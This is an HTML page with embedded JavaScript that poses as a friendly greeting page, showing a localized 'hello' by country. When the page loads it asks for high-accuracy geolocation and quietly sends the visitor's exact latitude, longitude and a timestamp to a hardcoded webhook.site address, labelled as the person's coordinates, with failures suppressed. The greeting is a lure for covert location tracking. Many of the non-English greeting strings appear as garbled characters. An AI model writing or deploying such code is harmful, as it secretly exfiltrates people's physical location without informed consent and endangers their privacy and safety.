<body>
  <div id="message">Please allow  ‚Äî I want to send you a greeting!</div>

  <script>
    const WEBHOOK_URL = 'https://webhook.site/5f203b29-c0d7-4839-a309-5429a99f66b8';
    const messageEl = document.getElementById('message');

    // Localized greetings by country code
    const greetings = {
      'IN': '‡§®‡§Æ‡§∏‡•ç‡§§‡•á!',
      'ES': '¬°Hola!',
      'FR': 'Bonjour !',
      'DE': 'Hallo!',
      'JA': '„Åì„Çì„Å´„Å°„ÅØÔºÅ',
      'KO': 'ÏïàÎÖïÌïòÏÑ∏Ïöî!',
      'RU': '–ü—Ä–∏–≤–µ—Ç!',
      'CN': '‰Ω†Â•ΩÔºÅ',
      'AR': 'ŸÖÿ±ÿ≠ÿ®ÿß!',
      'PT': 'Ol√°!',
      'IT': 'Ciao!',
      'BN': '‡¶®‡¶Æ‡¶∏‡ßç‡¶ï‡¶æ‡¶∞!',
      'TA': '‡Æµ‡Æ£‡Æï‡Øç‡Æï‡ÆÆ‡Øç!',
      'TE': '‡∞®‡∞Æ‡∞∏‡±ç‡∞ï‡∞æ‡∞∞‡∞Ç!',
      'MR': '‡§®‡§Æ‡§∏‡•ç‡§ï‡§æ‡§∞!',
      'GU': '‡™®‡™Æ‡™∏‡´ç‡™§‡´á!',
      'default': 'Hello!'
    };

    function getGreeting(countryCode) {
      return greetings[countryCode] || greetings.default;
    }

    function sendCoordinates(lat, lon) {
      const url = `${WEBHOOK_URL}?lat=${encodeURIComponent(lat)}&lng=${encodeURIComponent(lon)}&message=${encodeURIComponent("Person's coordinate on page load")}&timestamp=${encodeURIComponent(new Date().toISOString())}`;
      fetch(url, { method: 'GET' }).catch(() => {});
    }

    async function getCountryCode(lat, lon) {
      try {
        const res = await fetch(
          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`
        );
        const data = await res.json();
        return data.countryCode || 'default';
      } catch {
        return 'default';
      }
    }

    function onLocationSuccess(pos) {
      const { latitude, longitude } = pos.coords;

      // Send coordinates
      sendCoordinates(latitude, longitude);

      // Show greeting
      getCountryCode(latitude, longitude).then(country => {
        const greeting = getGreeting(country);
        messageEl.textContent = `${greeting} üåç`;
      });
    }

    function onLocationError() {
      // Do nothing ‚Äî keep the original "please allow" message
      // (This includes denied, timeout, unavailable, etc.)
    }

    // üî• Trigger location request immediately on page load
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        onLocationSuccess,
        onLocationError,
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 600000 }
      );
    }
    // If geolocation unsupported (very rare), message stays as is
  </script>
